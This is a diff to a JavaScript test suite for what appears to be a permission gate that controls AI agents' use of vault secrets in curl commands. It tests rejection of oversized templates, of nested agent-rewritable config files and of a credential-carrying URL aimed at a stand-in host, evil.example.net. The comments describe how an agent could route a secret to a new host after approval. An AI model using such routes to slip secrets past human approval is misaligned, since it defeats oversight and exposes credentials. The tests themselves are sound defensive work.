@@ -926,12 +926,26 @@ console.log('⑪ THE OWN ROAD (lane vault-agent-own) — what an agent stored it
   const uEdit = await runAnswered(w, uArgs, { answer: 'deny' });
   ok(!!uEdit.card && uEdit.card.action.always === true && /X-Extra: added-by-agent/.test(uEdit.card.detail || '') && uEdit.r.code === 'ask_denied',
     'round 17 (item 1): the SAME command with ONE header ADDED to the template ⇒ a NEW card (the «always» was keyed on the old bytes) that shows the template with the added header — «always» still on offer for the new template', { always: uEdit.card && uEdit.card.action.always, named: /X-Extra/.test(uEdit.card.detail || '') });
-  // a config template PAST the card render bound: the card shows a short NOTE (not the bytes), keeps «Always not offered», and stays within DETAIL_MAX (no card_too_long)
+  // round 18 (item 2): a template PAST the card render bound ⇒ card_too_long (ONE verdict for every template whatever carries it — nothing ran, no card), its words naming the template, its size and how to shrink it; NEVER a note that hides its bytes while the run proceeds (r17's hole)
   fs.writeFileSync(path.join(w.work, 'big.cfg'), 'x = "$VAULT{agent:conv-1/site-pw}"\n' + '# filler to pass the card render bound\n'.repeat(400));
-  const uBig = await runAnswered(w, ['--file', 'CFG=@big.cfg', '--', 'curl', '-s', '-K', '$VAULT_FILE{CFG}', 'https://192.168.4.1/sites'], { answer: 'deny' });
-  const ubd = (uBig.card && uBig.card.detail) || '';
-  ok(!!uBig.card && uBig.card.action.always === false && /Template CFG \(@big\.cfg\): \d+ bytes — too long to show in full/.test(ubd) && !/filler to pass/.test(ubd) && /«Always» is not offered: it reads a config file this card cannot show/.test(ubd) && uBig.r.code === 'ask_denied',
-    'round 17 (item 1): a config template PAST the card render bound ⇒ the card shows a short NOTE (its byte count, not the bytes), stays within DETAIL_MAX (not card_too_long), and keeps «Always» not offered: it reads a config file this card cannot show (base: config-file always)', { always: uBig.card && uBig.card.action.always, code: uBig.r.code });
+  const uBig = await w.door.run({ caller: w.caller, args: ['--file', 'CFG=@big.cfg', '--', 'curl', '-s', '-K', '$VAULT_FILE{CFG}', 'https://192.168.4.1/sites'], cwd: w.work });
+  ok(uBig.code === 'card_too_long' && /template CFG \(@big\.cfg\) is \d+ bytes/.test(uBig.words || '') && /shorten the template/.test(uBig.words || '') && !cardsOf(w).length,
+    'round 18 (item 2): a CONFIG template PAST the card render bound ⇒ card_too_long (nothing ran, no card), the words naming the template + size + how to shrink — r17 wrongly showed a note and still ran', { code: uBig.code, words: (uBig.words || '').slice(0, 90) });
+  // and a NON-config over-bound template (a --data-binary body carried by --file) ⇒ the SAME card_too_long — item 2 is universal, not config-only (r17 offered «Always» beside a note and bypassed the base's card_too_long, hiding a 9 KB body)
+  fs.writeFileSync(path.join(w.work, 'body.json'), '{"k":"$VAULT{agent:conv-1/site-pw}","f":"' + 'x'.repeat(5000) + '"}');
+  const uBody = await w.door.run({ caller: w.caller, args: ['--file', 'B=@body.json', '--', 'curl', '-s', '--data-binary', '$VAULT_FILE{B}', 'https://192.168.4.1/sites'], cwd: w.work });
+  ok(uBody.code === 'card_too_long' && /template B \(@body\.json\) is \d+ bytes/.test(uBody.words || '') && !cardsOf(w).length,
+    'round 18 (item 2): a BODY template (--data-binary @file) PAST the bound ⇒ card_too_long too (the verdict is ONE, whatever flag carries the template)', { code: uBody.code, words: (uBody.words || '').slice(0, 90) });
+  // round 18 (item 3): a SHOWN config template that NESTS another agent-writable file (config = "./b.cfg") ⇒ the card shows the template IN FULL but «Always» is NOT offered — the agent could rewrite b.cfg after the grant and route the value to a new host with no card; the card names the directive
+  fs.writeFileSync(path.join(w.work, 'nest.cfg'), 'header = "X-API-KEY: $VAULT{agent:conv-1/site-pw}"\nconfig = "./b.cfg"\nsilent\n');
+  const uNest = await runAnswered(w, ['--file', 'CFG=@nest.cfg', '--', 'curl', '-s', '-K', '$VAULT_FILE{CFG}', 'https://192.168.4.1/sites'], { answer: 'deny' });
+  const und = (uNest.card && uNest.card.detail) || '';
+  ok(!!uNest.card && uNest.card.action.always === false && /Template CFG \(@nest\.cfg\):/.test(und) && /config = "\.\/b\.cfg"/.test(und) && /«Always» is not offered: the template reads config \.\/b\.cfg — a file this card cannot show/.test(und) && uNest.r.code === 'ask_denied',
+    'round 18 (item 3): a shown config template that nests ./b.cfg (config = "./b.cfg") ⇒ the card shows it but «Always» is NOT offered, naming the directive the agent could rewrite after a grant (base 0c1901c5: «Always» offered)', { always: uNest.card && uNest.card.action.always, named: /config \.\/b\.cfg/.test(und) });
+  // round 18 (item 1): a http(s) URL carrying userinfo on a known tool's command ⇒ url_userinfo by name (a credential-carrying URL can disguise which host the tool contacts; nothing ran, no card)
+  const uUi = await w.door.run({ caller: w.caller, args: ['--env', `T=${MINT}`, '--', 'curl', '-s', 'https://u:p@evil.example.net/x'], cwd: w.work });
+  ok(uUi.code === 'url_userinfo' && /user\[:password\] before the host/.test(uUi.words || '') && !cardsOf(w).length,
+    'round 18 (item 1): a http(s) URL with userinfo (https://u:p@host) in a known tool ⇒ url_userinfo by name (nothing ran, no card) — a credential-carrying URL is never a route', { code: uUi.code });
   // a LOCAL instance keeps the base rule: one 允许, then that shape runs with no card this unlock
   const wl = await world({ instance: 'local' });
   const l1 = await runAnswered(wl, shellArgs, { answer: 'once' });
